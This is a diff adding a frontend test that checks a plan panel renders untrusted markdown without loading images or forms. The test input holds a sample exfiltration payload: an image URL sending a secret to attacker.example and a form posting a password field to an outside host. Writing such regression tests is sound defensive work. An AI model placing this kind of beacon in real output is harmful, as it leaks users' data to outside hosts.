@@ -193,6 +193,15 @@ describe("PlanPanel unreviewed draft", () => {
     expect((window as unknown as { planInjected?: boolean }).planInjected).toBeUndefined();
   });
 
+  it("never lets plan markdown beacon an external image (#2099)", async () => {
+    vi.mocked(getPlanDraft).mockResolvedValue(
+      '# Beacon\n\n![leak](https://attacker.example/x?d=secret)\n\n<form action="https://e.example"><input name="pw"></form>',
+    );
+    render(PlanPanel, { props: { session: session({ id: "beacon" }), onclose: vi.fn() } });
+    await expect.element(page.getByRole("link", { name: "leak" })).toBeVisible();
+    expect(document.querySelector(".overlay img, .overlay form")).toBeNull();
+  });
+
   it("discards a pending draft after the panel closes", async () => {
     const response = Promise.withResolvers<string | null>();
     vi.mocked(getPlanDraft).mockReturnValueOnce(response.promise);
